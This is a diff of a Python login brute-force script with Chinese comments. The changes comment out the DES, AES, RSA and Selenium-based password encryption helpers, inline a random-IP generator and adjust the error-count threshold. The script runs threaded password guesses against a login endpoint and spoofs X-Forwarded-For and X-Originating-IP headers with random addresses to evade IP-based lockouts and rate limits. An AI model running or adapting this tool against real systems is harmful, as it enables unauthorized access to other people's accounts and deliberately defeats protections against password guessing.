@@ -1,15 +1,20 @@
 # coding=utf-8
 
-import requests, urllib3, random, os, traceback, time, binascii, base64, threading, re
+# python -m pip install requests requests-ntlm pycryptodome
+# python -m pip install lxml selenium
+
+import requests, urllib3, random, os, traceback, time, binascii, base64, threading
 from requests.exceptions import ConnectTimeout, ConnectionError, ReadTimeout
-from requests_ntlm import HttpNtlmAuth
 from urllib3.exceptions import MaxRetryError
 from datetime import datetime, timedelta
+from concurrent import futures
+# 加密支持
 from Crypto.PublicKey import RSA
 from Crypto.Cipher import DES, AES, PKCS1_v1_5
 from Crypto.Util.Padding import pad
-from concurrent import futures
+# XPath支持
 from lxml import etree
+# 模拟执行JS
 from selenium.webdriver.chrome.options import Options
 from selenium import webdriver
 
@@ -76,74 +81,76 @@ def write_to_file(path: str, lock, text: str):
             fout.write(text)
 
 #
-# =================== [ 工具函数 ] ===================
+# =================== [ 加密函数 ] ===================
 #
 
-# DES加密
-def DES_encrypt(message: str) -> str:
-    cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
-    message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
+# # DES加密
+# def DES_encrypt(message: str) -> str:
+    # cipher = DES.new(key=b'12345678', iv=b'12345678', mode=DES.MODE_CBC)
+    # message = pad(message.encode('utf-8'), DES.block_size, style='pkcs7')
+    # encrypted = cipher.encrypt(message)
+    # encrypted = base64.b64encode(encrypted) # BASE64
+    # #encrypted = binascii.hexlify(encrypted) # HEX
+    # return encrypted.decode('utf-8') #.upper()
 
-# AES加密
-def AES_encrypt(message: str) -> str:
-    cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=DES.MODE_CBC)
-    message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
+# # AES加密
+# def AES_encrypt(message: str) -> str:
+    # cipher = AES.new(key=b'1234567890ABCDEF', iv=b'1234567890ABCDEF', mode=DES.MODE_CBC)
+    # message = pad(message.encode('utf-8'), AES.block_size, style='pkcs7')
+    # encrypted = cipher.encrypt(message)
+    # encrypted = base64.b64encode(encrypted) # BASE64
+    # #encrypted = binascii.hexlify(encrypted) # HEX
+    # return encrypted.decode('utf-8') #.upper()
 
-# RSA加密
-def RSA_encrypt(message: str) -> str:
-    pubkey = """-----BEGIN PUBLIC KEY-----
-MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
-P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
-PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
-2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
-n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
-oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
-YwIDAQAB
------END PUBLIC KEY-----"""
-    pubkey = RSA.importKey(pubkey)
-    cipher = PKCS1_v1_5.new(pubkey)
-    message = message.encode('utf-8')
-    encrypted = cipher.encrypt(message)
-    encrypted = base64.b64encode(encrypted) # BASE64
-    #encrypted = binascii.hexlify(encrypted) # HEX
-    return encrypted.decode('utf-8') #.upper()
+# # RSA加密
+# def RSA_encrypt(message: str) -> str:
+    # pubkey = """-----BEGIN PUBLIC KEY-----
+# MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyyD6Zn7VNrR/YknPProx
+# P9oEzkxeG+VCFLwQ+k2cAWuYWQKSnXSW/UX3sHLIyLXsorKQe19pQOIjssr46KN+
+# PQbDVG7zaj6RZZlTC+q6/kXwRw0v9wXQ2dXBjNdCDNNwop/GxavvKhLJonKRgVFm
+# 2Y4cUxxcL/ZukvJ5aJAaHoRaf7/jq4vTDWARyroFh6pEN7TGg3acwH9YSpkOX5sV
+# n7pT9qwFOZ+DdvIUOIvO3hIRA1PDQOSVJRawsffwqFCzxeZMmeakEr7Tn4NavkVL
+# oXdRoE29N6JHoBBinjNd/yLCE352E2M/WJeYNhlugzVyFNcuyckqsIl5Hrm3qHvT
+# YwIDAQAB
+# -----END PUBLIC KEY-----"""
+    # pubkey = RSA.importKey(pubkey)
+    # cipher = PKCS1_v1_5.new(pubkey)
+    # message = message.encode('utf-8')
+    # encrypted = cipher.encrypt(message)
+    # encrypted = base64.b64encode(encrypted) # BASE64
+    # #encrypted = binascii.hexlify(encrypted) # HEX
+    # return encrypted.decode('utf-8') #.upper()
 
-# 随机IP生成
-def random_ipv4():
-    return ".".join(str(random.randint(0,255)) for _ in range(4))
+#
+# =================== [ JS脚本执行 ] ===================
+#
 
-# 浏览器执行JS脚本
-def selenium_runtime():
-    browser_options = Options()
-    browser_options.add_argument('--headless')
-    browser_options.add_argument('--disable-gpu')
-    browser = webdriver.Chrome(options=browser_options)
-    # 载入网页中的JS脚本
-    browser.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')
-    # 载入自定义JS脚本
-    js = r'''
-pk = "-----BEGIN PUBLIC KEY-----\n";
-pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
-pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
-pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
-pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
-pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
-pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
-pk += "yQIDAQAB\n";
-pk += "-----END PUBLIC KEY-----";
-cipher = new JSEncrypt;
-cipher.setPublicKey(pk);
-'''
-    browser.execute_script(js)
-    return browser
+# # 利用selenium来执行JS脚本
+# BROWSER_OPTIONS = Options()
+# BROWSER_OPTIONS.add_argument('--headless')
+# BROWSER_OPTIONS.add_argument('--disable-gpu')
+
+# # 载入网页中的JS脚本
+# BROWSER = webdriver.Chrome(options=BROWSER_OPTIONS)
+# BROWSER.get('data:text/html;charset=utf-8,<script src="https://example.com/js/jsencrypt.min.js"></script>')
+
+# # 载入自定义JS脚本
+# BROWSER.execute_script(r'''
+# pk = "-----BEGIN PUBLIC KEY-----\n";
+# pk += "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA2hQp7K25U5kQqE/WFX7f\n";
+# pk += "hq+YeaLCps8jiUZfIVmq8w2AtHMgdzsea7KCp1K98pcNg3bvdjBoxyfRB2uox0d8\n";
+# pk += "NzE6QZRTHT3LS57n6BVq4z+nGpXw4kiyIZYhflZnKph8pmbI4pucQaOj+0yUIYrs\n";
+# pk += "yRsHwAIpeGAxFhmgzGNYdxQ+UwUHk9tZqXdHfIIqd2/rbbbFLO6VnzQstRJTQrwa\n";
+# pk += "78NyznlEkmeOXPKMuh/WgrkA3+6cMYH6mnmt3zPzU0YnZDXsSpGViyErRty7s3O5\n";
+# pk += "X/u59C8ScMnvk52lVGYsAikAX8sL/rF6JNFke2A5CfSjtKKeGldU8LbWffF457xb\n";
+# pk += "yQIDAQAB\n";
+# pk += "-----END PUBLIC KEY-----";
+# cipher = new JSEncrypt;
+# cipher.setPublicKey(pk);
+# ''')
+
+# # 别忘了在脚本退出前关闭浏览器
+# BROWSER.quit()
 
 #
 # =================== [ 爆破函数 ] ===================
@@ -161,14 +168,11 @@ COOKIES = {
     'SESSIONID': '',
 }
 
-# 根据需要决定是否启动Selenium
-BROWSER = None
-#BROWSER = selenium_runtime()
-
 # 爆破函数，返回 (no_exception, found_password)
 def run(username, password):
 
-    IP = random_ipv4()
+    # 生成随机IP
+    IP = ".".join(str(random.randint(0,255)) for _ in range(4))
     HEADERS.update({
         "X-Forwarded-For": IP,
         "X-Originating-IP": IP,
@@ -277,7 +281,7 @@ def callback(future):
     with EXCEPTION_COUNT_LOCK:
         if no_exception == False:
             EXCEPTION_COUNT += 1
-            if EXCEPTION_COUNT > 10:
+            if EXCEPTION_COUNT > THREADS * 10: # 累计每个线程连续错误10次就退出
                 print(f"[x] {datetime.now().strftime('%H:%M:%S')} Too much error. Quiting.")
                 THREAD_POOL_STOP_SIGNAL = True
         else:
@@ -336,8 +340,8 @@ def report_elapsed_time():
     print(f"[+] {now.strftime('%H:%M:%S')} task finished, elapsed {elapsed}")
 
 # 启动进度报告线程
-THREAD = threading.Thread(target=report_elapsed_time)
-THREAD.start()
+REPORT_THREAD = threading.Thread(target=report_elapsed_time)
+REPORT_THREAD.start()
 
 # 线程池
 with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
@@ -351,9 +355,8 @@ with futures.ThreadPoolExecutor(max_workers=THREADS) as executor:
     finally:
         REPORT_THREAD_STOP_SIGNAL.set()
 
-# 要求浏览器退出
-if BROWSER:
-    BROWSER.quit()
+# # 要求浏览器退出
+# BROWSER.quit()
 
 # 等待线程退出
-THREAD.join()
+REPORT_THREAD.join()
